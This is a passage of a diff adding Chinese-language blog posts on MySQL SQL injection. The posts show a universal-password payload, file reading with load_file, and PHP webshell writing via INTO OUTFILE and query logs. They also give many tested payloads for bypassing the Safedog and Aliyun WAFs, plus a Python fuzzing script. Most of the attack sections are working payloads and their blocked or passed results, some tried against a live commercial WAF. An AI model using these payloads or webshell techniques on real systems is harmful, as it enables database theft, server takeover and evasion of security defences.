++----+-----------+-------+
+4 rows in set (0.00 sec)
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;经典的 &lt;code&gt;or 1=1--&lt;/code&gt;  其中 1=1 恒为 true 然后导致每条数据都成立返回&lt;/p&gt;
+&lt;p&gt;那么知道了这个原理怎么构造一个简单的万能密码呢&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;mysql&amp;gt; select &#39;&#39;=0
+    -&amp;gt; ;
++------+
+| &#39;&#39;=0 |
++------+
+|    1 |
++------+
+1 row in set (0.00 sec)
+
+mysql&amp;gt; select 1=0=0;
++-------+
+| 1=0=0 |
++-------+
+|     1 |
++-------+
+1 row in set (0.30 sec)
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;我们可以看到在 mysql 中 空字符串 &#39;&#39; 等于 0 为 1 也就是 true 知道这个特性我们可以来构造我们的万能密码了&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;mysql&amp;gt; select * from admin where name = &#39;&#39;|0#&#39;  and pass = &#39;123&#39;;
+    -&amp;gt; ;
++----+-----------+-------+
+| id | name      | pass  |
++----+-----------+-------+
+|  1 | admin     | admin |
+|  2 | admin&#39;111 | 11111 |
+|  3 | admin&#39;111 | 11    |
+|  4 | admin&#39;111 | 11    |
++----+-----------+-------+
+4 rows in set, 5 warnings (0.00 sec)
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;仅仅用了  &lt;code&gt;&#39;|0#&lt;/code&gt;  个字符就能达到我们的效果 其他方法大家还可以测试，因为是自己发现的，然后问了几个师傅 发现 ctf 已经别人都用过了 ，不得不承认自己的知识量远远不够。&lt;/p&gt;
+&lt;h1 id=&#34;0x00-读写文件与堆叠查询&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x00-读写文件与堆叠查询&#34;&gt;#&lt;/a&gt; 0x00 读写文件与堆叠查询&lt;/h1&gt;
+&lt;p&gt;MySQL 中 在在 mysql 5.6.34 版本以后 secure_file_priv 的值默认为 NULL , 而 secure_file_priv 为 null 那么我们就不能导出文件，以下都建立在&lt;/p&gt;
+&lt;p&gt;secure_file_priv 的默认值被修改为无才能利用，且这个只能手工修改配置文件不能用 sql 语句，也就是想直接导出需要管理员不知道干了什么帮你修改好这个权限才行。&lt;/p&gt;
+&lt;p&gt;windows 系统在 my.ini 的 [mysqld] 下面加上 secure_file_priv = ，linux 的在 /etc/my.cnf 同时读写权限问题就不用说了。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;mysql&amp;gt; show global variables like &#39;%secure%&#39;;
++------------------+-------+
+| Variable_name    | Value |
++------------------+-------+
+| secure_auth      | OFF   |
+| secure_file_priv |       |
++------------------+-------+
+2 rows in set (0.00 sec)
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h1 id=&#34;0x01-读文件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x01-读文件&#34;&gt;#&lt;/a&gt; 0x01 读文件&lt;/h1&gt;
+&lt;p&gt;可以把文件 hex 一下输出，文件名也是支持 hex 和 char 的&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;mysql&amp;gt; select * from admin union select 1,hex(load_file(&#39;D:\\1.txt&#39;)),3;
++------+------------------------+----------+
+| id   | username               | password |
++------+------------------------+----------+
+|    3 | bdmin                  | fdmin    |
+|    2 | admin                  | ddmin    |
+|    1 | cdmin                  | bdmin    |
+|    1 | 617574686F72A3BA343034 | 3        |
++------+------------------------+----------+
+4 rows in set (0.02 sec)
+
+http://127.0.0.1/sqli/Less-1/?id=-1&#39; union select 1,hex(load_file(0x463A5C5C312E747874)),3-- +
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;当然你加入你进了 phpmyadmin 类似的平台 可以执行 sql 语句，你可以选择把导入的数据插入表中&lt;br /&gt;
+同时支持导入的函数还有  &lt;code&gt;load data infile&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;create table test(test text);
+insert into test(test) values (load_file(&#39;D:\\1.txt&#39;));
+select * from test;
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;如果能读文件在渗透测试中往往很有用，可以读取配置文件，系统问题等等关键信息，在我以前的一次意淫中，进入一个后台功能全被限制死了，但是可以执行导入，通过一个编辑器的目录遍历，发现某文件时间不一致，读取出来发现是 webshell，应该是某黑客进去之后做的手脚&lt;/p&gt;
+&lt;h1 id=&#34;0x02-写文件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x02-写文件&#34;&gt;#&lt;/a&gt; 0x02 写文件&lt;/h1&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;写文件我们一般用到  &lt;code&gt;dumpfile&lt;/code&gt;  与 &lt;code&gt;outfile&lt;/code&gt;  她们其实是有区别&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;outfile&lt;/code&gt;  会在行末写入新行，而且会转义换行符&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;dumpfile&lt;/code&gt;  能导出一个完整的文件，不会有任何转义 所以我们 udf 提取一般用的 dumpfile&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;
+mysql&amp;gt; select * from admin where id =1 union select 1,&#39;&amp;lt;?php eval($_POST[cmd]);?&amp;gt;&#39;,3 into outfile &#39;G:\\test.txt&#39;;
+Query OK, 2 rows affected (0.00 sec)
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ol start=&#34;2&#34;&gt;
+&lt;li&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;后来大佬们找到一种方法通过日志来写 shell 解决这个史诗级难题，但是需要能直接执行 sql 语句利用有限&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;set global general_log=on;
+set global general_log_file=&#39;D://404.php&#39;;
+select &#39;&amp;lt;?php eval($_POST[&#39;404&#39;]) ?&amp;gt;&#39;;
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;通过把日志路径更改 ，让查询的日志保存过去，还有一种慢日志，原理一样&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;mysql&amp;gt; show global variables like &#39;%query_log%&#39;
+    -&amp;gt; ;
++---------------------+-------------------------------------------------------------+
+| Variable_name       | Value                                                       |
++---------------------+-------------------------------------------------------------+
+| slow_query_log      | OFF                                                         |
+| slow_query_log_file | D:\phpstudy\PHPTutorial\MySQL\data\LAPTOP-M4APUKKN-slow.log |
++---------------------+-------------------------------------------------------------+
+2 rows in set (0.00 sec)
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;set global slow_query_log=1;
+
+set global slow_query_log_file=&#39;D://404.php&#39;
+
+select &#39;&amp;lt;?php eval($_POST[&#39;404&#39;]) ?&amp;gt;&#39; or sleep(15);
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h1 id=&#34;0x03-堆叠查询&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x03-堆叠查询&#34;&gt;#&lt;/a&gt; 0x03 堆叠查询&lt;/h1&gt;
+&lt;p&gt;mysql 是支持堆叠查询的用 &lt;code&gt;;&lt;/code&gt;  分割语句，但是 php 原生的连接方式不支持，但是使用 PDO,mysqli_multi_query () 等等是支持多语句的，在我们使用堆叠查询的时候基本是没有回显的，而且其实很难遇到这种环境。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;mysql&amp;gt; select * from admin where id =1;select user();
++------+----------+----------+
+| id   | username | password |
++------+----------+----------+
+|    1 | cdmin    | bdmin    |
++------+----------+----------+
+1 row in set (0.00 sec)
+
++----------------+
+| user()         |
++----------------+
+| root@localhost |
++----------------+
+1 row in set (0.00 sec)
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这里讲在一起就是因为，假如支持堆叠查询还可以用日志来写 shell。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;
+http://192.168.59.129/Less-38/?id=1%27;set global general_log=on;set global general_log_file=&#39;C://phpstudy//404.php&#39;;--+
+
+http://192.168.59.129/Less-38/?id=1%27;select &#39;&amp;lt;?php eval($_POST[404]) ?&amp;gt;&#39;;--+
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h1 id=&#34;0x00-联合注入过狗&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x00-联合注入过狗&#34;&gt;#&lt;/a&gt; 0x00 联合注入过狗&lt;/h1&gt;
+&lt;p&gt;其实我们过这些 waf 就是个正则的绕过，因为这种通用型的 waf，需要考虑到用户体验，他不能出现什么东西就直接拦截，比正则过滤的一些好绕一点，如何成功绕过我们需要具备对 mysql 各个函数、语法、特性的熟悉，然后通过不断的 fuzz 来测试出我们想要的 payload 的&lt;/p&gt;
+&lt;p&gt;每个狗的版本不同，他的正则也是不同的所以有的 payload 在最新版可以用，在老版本就可能用不上，当你的知识量有一定的积累后，绕过 waf 或许就很简单，&lt;/p&gt;
+&lt;p&gt;如何快速的提升自己的这些知识，多看文章，多看官方手册。&lt;/p&gt;
+&lt;h1 id=&#34;0x01-探索-and&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x01-探索-and&#34;&gt;#&lt;/a&gt; 0x01 探索 and&lt;/h1&gt;
+&lt;p&gt;实验环境 ： win2003 apache 安全狗 4.0.23957&lt;/p&gt;
+&lt;p&gt;首先我们来探索简单的语句  &lt;code&gt;and 1=1&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;and 1    拦截
+and &#39;1&#39;  拦截
+and a    不拦截
+and &#39;a&#39;  拦截
+and !    不拦截
+and 1+1  拦截
+and 1+a  拦截
+and hex(1) 不拦截
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;通过测试我们发现当 and 后面跟上 数字型和字符型时他会给我们拦截掉 ，其实我们在安全狗的规则里面可以看到他拦截 and 和 or 所以我们有 2 个思路&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;用其他字符替换 and 或者 or&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;带入的不是字符串和数字型，带入一个特殊符号&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;针对第一种我们可以去看看运算符号 随便找到几个 &lt;code&gt;| ^ xor &amp;amp; / * &amp;amp;&amp;amp; ||&lt;/code&gt;  等等还有很多&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;mysql&amp;gt; select &#39;1&#39;|1;
++-------+
+| &#39;1&#39;|1 |
++-------+
+|     1 |
++-------+
+1 row in set (0.00 sec)
+
+
+mysql&amp;gt; select &#39;1&#39;&amp;amp;1;
++-------+
+| &#39;1&#39;&amp;amp;1 |
++-------+
+|     1 |
++-------+
+1 row in set (0.00 sec)
+
+mysql&amp;gt; select &#39;1&#39;^1;
++-------+
+| &#39;1&#39;^1 |
++-------+
+|     0 |
++-------+
+1 row in set (0.00 sec)
+
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;知道这个了我们带入我们的语法就很简单了 通过运算符来改变 ID 的值 查看页面是否变化 这是可行的。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;mysql&amp;gt; select * from admin where id =&#39;1&#39;|2-- +&#39;;
+    -&amp;gt; ;
++------+----------+----------+
+| id   | username | password |
++------+----------+----------+
+|    3 | bdmin    | fdmin    |
++------+----------+----------+
+1 row in set (0.00 sec)
+
+mysql&amp;gt; select * from admin where id =&#39;1&#39;|1-- +&#39;;
+    -&amp;gt; ;
++------+----------+----------+
+| id   | username | password |
++------+----------+----------+
+|    1 | cdmin    | bdmin    |
++------+----------+----------+
+1 row in set (0.00 sec)
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;经过测试你还会发现他的正则不全 &lt;code&gt;&amp;amp;&amp;amp; true&lt;/code&gt;  也是可以的。&lt;/p&gt;
+&lt;p&gt;那我们可以不可以正面刚 &lt;code&gt;and&lt;/code&gt;   &lt;code&gt;or&lt;/code&gt;  呢，当然也是可行的，前面我们测试过  &lt;code&gt;and hex(1)&lt;/code&gt;  不拦截其实已经可以拿来判断了，但是我们还要深入的探究&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;and hex(1)=&lt;/code&gt;  也是不拦截的 但是后面加入字符型和数字型他又开始拦截，所以我们可以猜测 他判断 = 左右的字符类型，经过测试就能出来很多我们想要的&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;and ~1&amp;gt;1
+
+and hex(1)&amp;gt;-1
+
+and hex(1)&amp;gt;~1
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;再深入探究 你就会发现 安全狗他只在乎 数字型的正数，而不在乎负数，也就是 &lt;code&gt;and -2&amp;lt;-1&lt;/code&gt;  就能过狗，也可能是 &lt;code&gt;-&lt;/code&gt;  绕过了他的正则&lt;/p&gt;
+&lt;h1 id=&#34;0x02-探索-union-select&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x02-探索-union-select&#34;&gt;#&lt;/a&gt; 0x02 探索 union select&lt;/h1&gt;
+&lt;ol&gt;
+&lt;li&gt;内联注释绕过&lt;/li&gt;
+&lt;/ol&gt;
+&lt;pre&gt;&lt;code&gt;union    不拦截
+select   不拦截
+union select 拦截
+union 各种字符 select 拦截
+union/*select*/ 不拦截
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;通过简单的测试我们发现安全狗还是认识我们我们的注释的符号的，所以我们就需要通过这个来绕过我们的安全狗，前面符号一章我讲过注释符号的几种，我们主要使用的是&lt;/p&gt;
+&lt;p&gt;内联注释  &lt;code&gt;/*!/*!*/&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;http://192.168.59.129/Less-1/?id=1&#39; union/*!/*!50000select*/ 1,2,3--+  拦截
+
+http://192.168.59.129/Less-1/?id=1&#39; union/*!/*!5select*/ 1,2,3--+  不拦截
+
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;为什么不拦截 ，因为 50000 是他的版本号，你多一位少一位语句是不能能正常执行的，所以他就放行了，那么我们可以用 burp 来遍历这个值呢，结果的确是我们想要的&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;http://192.168.59.129/Less-1/?id=1&#39; union/*!/*!11440select*/ 1,2,3--+ 不拦截
+
+http://192.168.59.129/Less-1/?id=1&#39; union/*!11441/*!11440select*/ 1,2,3--+ 不拦截
+
+http://192.168.59.129/Less-1/?id=1&#39; union/*!11440select*/ 1,2,3--+ 不拦截
+
+http://192.168.59.129/Less-1/?id=-1&#39; union/*!11440/**/%0aselect*/ 1,2,3--+  不拦截
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这句 bypass 的核心就在于版本号，然后你就感觉 fuzz 了千种姿势，但是核心还是这个，最简也是这个，万变不离其宗。&lt;br /&gt;
+2. 注释绕过&lt;/p&gt;
+&lt;p&gt;联想注释我们还知道有 -- # 那么他们可以利用吗，当然是肯定的，其实很久以前就有大佬发过这个语句了是&lt;br /&gt;
+ &lt;code&gt;union %23%0aselect&lt;/code&gt;  因为这些都是单行注释，而 %0a 是换行的 url 编码，大家可以换行后用 url 编码看看，就是这个，&lt;br /&gt;
+但是这样已经被加入规则库了，如何绕过呢 非常简单 当然这是个 fuzz 的过程，其实我只想写出思路，而不是直接给 payload。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;union %23%0aselect 拦截
+
+union %23select 拦截
+
+union a%23 select 不拦截
+
+union all%23 select 不拦截
+
+union all%23%0a select 不拦截
+
+union %23%0aall select 不拦截
+
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;有时候 fuzz 右边不行 不如看看左边 为什么可以加 all 这个你就得看看 mysql 手册了，其实测试到最后发现 %23%0a 中间不能加字符否则会被拦截。&lt;/p&gt;
+&lt;ol start=&#34;3&#34;&gt;
+&lt;li&gt;-- 注释绕过&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;-- 其实大佬们也一样很早说了不过最初的姿势是  &lt;code&gt;-- %0a&lt;/code&gt;  当然已经被加入豪华午餐了，所以我们来测试&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;union all -- %0a select 拦截
+
+union  -- ()%0a select 拦截
+
+union  -- 1%0a select 不拦截
+
+union  -- hex()%0a select 不拦截
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;懂我意思吧，怎么绕出来，发挥你的现象，总之俩开花。&lt;/p&gt;
+&lt;ol start=&#34;4&#34;&gt;
+&lt;li&gt;老生常谈 hpp 被人遗忘的手法&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;前面说过  &lt;code&gt;/**/&lt;/code&gt;  里面的内容安全狗基本不管了，那么我们用 hpp 参数污染来绕过就很简单了&lt;br /&gt;
+照成这个手法的原因是 web server 对参数的解析问题 在 php/apache 中 它总解析最后一个 id&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;http://192.168.59.129/Less-1/?id=-1&#39; /*&amp;amp;id=&#39;union select 1,user(),3 -- +*/
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h1 id=&#34;0x03-注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x03-注入&#34;&gt;#&lt;/a&gt; 0x03 注入&lt;/h1&gt;
+&lt;p&gt;既然绕过了  &lt;code&gt;union select&lt;/code&gt;  那么注入就简单了 首先来看个  &lt;code&gt;user()&lt;/code&gt;  , 因为它是被拦截的所以我们需要简单的绕过它&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;user()   拦截
+user/**/() 拦截
+user/**/(/**/) 拦截
+hex(user/**/(/**/)) 不拦截
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;接着就是爆库名&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;union  -- hex()%0a select 1,schema_name,3 from `information_schema`.schemata limit 1,1
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;接下来的流传都差不多了 关键点就是在于 from 后面这块 后面的我以这个  &lt;code&gt;information_schema.schemata&lt;/code&gt;  为例展示几种思路可能有的不能过&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;`information_schema`.schemata
+`information_schema`.`schemata`
+information_schema.`schemata`
+(information_schema.schemata)
+information_schema/**/.schemata
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h1 id=&#34;0x04-文末&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x04-文末&#34;&gt;#&lt;/a&gt; 0x04 文末&lt;/h1&gt;
+&lt;p&gt;这么多手法又有多少人认真看了呢，认真去试过，探索。&lt;/p&gt;
+&lt;h1 id=&#34;0x00-延时过狗&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x00-延时过狗&#34;&gt;#&lt;/a&gt; 0x00 延时过狗&lt;/h1&gt;
+&lt;p&gt;盲注过狗相对联合注入来说，感觉上是更简单，我们先来试试时间盲注把，比布尔稍稍灵活一点&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt; if(1,1,1) 不拦截
+ a if(1,1,1) 不拦截
+ and if(1,1,1) 拦截
+ | if(1,1,1) 不拦截
+ || if(1,1,1) 拦截
+ &amp;amp;&amp;amp; if(1,1,1) 拦截
+/*!and*/ if(1,1,1) 拦截
+ /*!11440and*/ if(1,1,1) 不拦截
+ andaif(1,1,1) 不拦截
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;通过上面的测试我们其实可以很简单的看出来 他是拦截的 xx if 这个语句，其中 xx 为 and 和 or 这 2 个词有点敏感，但是绕过还是可以的&lt;/p&gt;
+&lt;p&gt;通过上一章的测试语句 发现版本为 11440 的 内联注释直接放行，咳咳这样后面就直接注入，感觉并不是我们这一章想要的，我们这一章来试试不用内联注释内不内绕过&lt;/p&gt;
+&lt;p&gt;查阅乌云知识库发现一个小知识点  &lt;code&gt;and!!!1=1&lt;/code&gt;  and 后面可以接上奇数个特殊的字符包括不限于 &lt;code&gt;! ~ &amp;amp; -&lt;/code&gt;  其他还可以自己测试 那么我们的 payload 就能构造出来了&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;and!!!if((substr((select hex(user/**/(/*!*/))),1,1)&amp;gt;1),sleep/**/(/*!5*/),1)
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;系统函数怎绕过我就不多说了每一张就有&lt;/p&gt;
+&lt;h1 id=&#34;0x01-布尔过狗&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x01-布尔过狗&#34;&gt;#&lt;/a&gt; 0x01 布尔过狗&lt;/h1&gt;
+&lt;p&gt;布尔注入过狗只能说是相对来说最简单的吧，因为可以不使用条件语句，少了一个绕过点&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;and!!!substr((select unhex(hex(user/**/(/*!*/)))),1,1)=&#39;r&#39; 拦截
+
+and!!!substr((select unhex(hex(user/**/(/*!*/)))),1,1)=r 不拦截
+
+and!!!substr((select unhex(hex(user/**/(/*!*/)))),1,1)=1 不拦截
+
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;上面忘了说的就是这个点 =r 这里 不能使用引号，那绕过他就很简单了 什么 HEX ASCII 都行，通过测试发现 使用布尔盲注 他的过滤真的很差，我们试试 把 and 换成 &amp;amp;&amp;amp;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;and substr((select hex(user/**/(/*!*/))),1,1)&amp;gt;1 拦截
+
+/*!and*/ substr((select hex(user/**/(/*!*/))),1,1)&amp;gt;1 拦截
+
+%26%26 substr((select hex(user/**/(/*!*/))),1,1)&amp;gt;1 拦截
+
+/*!%26%26*/ substr((select hex(user/**/(/*!*/))),1,1)&amp;gt;1 不拦截
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h1 id=&#34;0x02-文末-3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x02-文末-3&#34;&gt;#&lt;/a&gt; 0x02 文末&lt;/h1&gt;
+&lt;p&gt;自己不测试 永远发现不了新东西&lt;/p&gt;
+&lt;h1 id=&#34;0x00-探索报错&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x00-探索报错&#34;&gt;#&lt;/a&gt; 0x00 探索报错&lt;/h1&gt;
+&lt;p&gt;报错注入的绕过，感觉很少人提过，不少人绕过也有一定的误区吧，这里提一提&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;updatexml 不拦截
+
+updatexml(1,2,3 不拦截
+
+updatexml(1,2) 不拦截
+
+updatexml(1,2,) 不拦截
+
+updatexml(,2,1) 不拦截
+
+updatexml(1,2,!) 拦截
+
+updatexml(1,2,%) 拦截
+
+updatexml(,2,1,hex()) 拦截
+
+and updatexml(1,2,3 不拦截
+
+updatexml(1,2,3) 拦截
+
+and updatexml(1,2,3) 拦截
+
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;到这里我们 大概知道了，他的判断   &lt;code&gt;updatexml()&lt;/code&gt;  的完整性 ，当里面按逗号分割出现出现 3 个字符时，就会拦截，当然有个别特殊的字符串他没过滤&lt;/p&gt;
+&lt;p&gt;这样我们在括号里面做手脚的可能性很渺茫，那么我们还有 什么方法呢， 可以尝试把  &lt;code&gt;updatexml()&lt;/code&gt;  函数分开，或者给 updatexml 加个外套。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt; /*updatexml*/(1,1,1) 不拦截
+
+ /*!updatexml*/(1,1,1) 拦截
+
+ /*!5000updatexml*/(1,1,1) 不拦截
+
+ /*!11440updatexml*/(1,1,1) 不拦截
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;看来  &lt;code&gt;updatexml()&lt;/code&gt;  函数我们已经绕过了 需要前面加个 运算符号了&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;and /*!11440updatexml*/(1,(select hex(user/**/(/**/))),1)  拦截
+
+or /*!11440updatexml*/(1,(select hex(user/**/(/**/))),1) 拦截
+
+/*!and*/ /*!11440updatexml*/(1,(select hex(user/**/(/**/))),1) 拦截
+
+/*!%26%26*/ /*!11440updatexml*/(1,(select hex(user/**/(/**/))),1) 不拦截
+
+/*!||*/ /*!11440updatexml*/(1,(select hex(user/**/(/**/))),1) 不拦截
+
+/*!xor*/ /*!11440updatexml*/(1,(select hex(user/**/(/**/))),1) 不拦截
+
+ | /*!11440updatexml*/(1,(select hex(user/**/(/**/))),1) 不拦截
+
+ xor /*!11440updatexml*/(1,(select hex(user/**/(/**/))),1) 不拦截
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;那么有没有什么可以包裹他的呢，其实我们查看 mysql 手册找到这么一个符号 开单引号 ASCII 96&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;http://192.168.130.135/Less-1/?id=1&#39; and `updatexml`(1,(select hex(user/**/(/**/))),1)-- +
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;那么我们写个小脚本跑看看 还有没有&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;import requests
+import urllib
+
+for i in range(0,177):
+    url = r&amp;quot;http://192.168.130.135/Less-1/?id=1%27%20xor%20&amp;#123;fuzz&amp;#125;updatexml&amp;#123;fuzz&amp;#125;(1,(select hex(user/**/(/**/))),1)--%20+&amp;quot;.format(fuzz=urllib.quote(chr(i)))
+    req = requests.get(url)
+    if &amp;quot;F6F7&amp;quot; in req.text:
+        print len(req.text),i,urllib.quote(chr(i))
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;发现确实没有其他利用的了，当然你用前面的注释方法也是可行的&lt;/p&gt;
+&lt;h1 id=&#34;0x01-文末&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x01-文末&#34;&gt;#&lt;/a&gt; 0x01 文末&lt;/h1&gt;
+&lt;p&gt;脚本只是你的一个思路衍生&lt;/p&gt;
+&lt;h1 id=&#34;0x00-矛与云盾过狗&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x00-矛与云盾过狗&#34;&gt;#&lt;/a&gt; 0x00 矛与云盾过狗&lt;/h1&gt;
+&lt;p&gt;由于没有阿里云盾的试验环境，以下操作都在线上测试，总的来说阿里云还是比较不好绕的，因为对于 &lt;code&gt;/**/  /*!*/&lt;/code&gt;  他是强过滤，根本不能用，我们先来测试简单语句&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;and 1=1 拦截
+
+&amp;amp;&amp;amp; 1=1 不拦截
+
+or 1=1 拦截
+
+|| 1=1 不拦截
+
+and 1 不拦截
+
+and 1= 拦截
+
+and = 拦截
+
+and 1&amp;gt; 不拦截
+
+and 1&amp;gt;1 拦截
+
+and 1&amp;gt;a 拦截
+
+and 1&amp;gt;! 不拦截
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;通过简单的测试我们发现，他对 &amp;amp;&amp;amp; || 过滤还是不是很严 ，and 的话是不让用直接接入 = 号的，综合一下前面的知识，我们可以想到几个方法。&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;不用 and 和 or&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;用 and 在两边接入干扰字符&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;pre&gt;&lt;code&gt;and ~1=1   不拦截
+
+and!!!1=1  不拦截
+
+and 1-1    不拦截
+
+and true 不拦截
+
+and 1 不拦截
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h1 id=&#34;0x01-注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x01-注入&#34;&gt;#&lt;/a&gt; 0x01 注入&lt;/h1&gt;
+&lt;ol&gt;
+&lt;li&gt;盲注&lt;/li&gt;
+&lt;/ol&gt;
+&lt;pre&gt;&lt;code&gt; and substr(1,1,1)=&#39;r&#39; 拦截
+
+ &amp;amp;&amp;amp;  substr(1,1,1)=&#39;r&#39;  不拦截
+
+ and!!!substr(1,1,1)=&#39;r&#39; 不拦截
+
+ and!!!substr((select),1,1)=&#39;r&#39; 不拦截
+
+ and!!!substr((select a()),1,1)=&#39;r&#39; 不拦截
+
+ and!!!substr((select user()),1,1)=&#39;r&#39; 拦截
+
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;可以知道 select 后面加入 常见函数会被拦截，所以我们可以 使用一定的东西来分割他 但是 &lt;code&gt;/**/&lt;/code&gt;  和 &lt;code&gt;/*!*/&lt;/code&gt;  是不能用的，所以最后想到 就是 注释符号&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;and!!!substr((select user-- (1)%0a()),1,1)=&#39;r&#39; 不拦截  edu
+
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;测试一会儿发现他对某些关键词拦截还是很严格的，绕过应该是可以的，一些生僻的函数加点东西 他就不会拦截&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;and!!!substr((select @@`datadir`),1,1)=&#39;D&#39;-- + 拦截                     yq
+and!!!substr((select&amp;#123;x @@datadir&amp;#125;),1,1)=&#39;D&#39; 不拦截
+and!!!substr((select&amp;#123;x @@`datadir`&amp;#125;),1,1)=&#39;D&#39;-- + 不拦截
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这里比较难的是 from 的绕过，虽然最后绕过了，但是感觉不是很完美&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;from 不拦截
+
+from user 不拦截
+
+select from user 拦截                edu
+
+select all from user 拦截
+
+select from(user) 拦截
+
+select from&amp;#123;user&amp;#125; 拦截
+
+select from[user] 不拦截
+
+select from [user] 拦截
+
+
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;最后想到 web+mysql 好像编码的问题 也能让解析我们的中文字符 但是这种对环境要求比较大&lt;/p&gt;
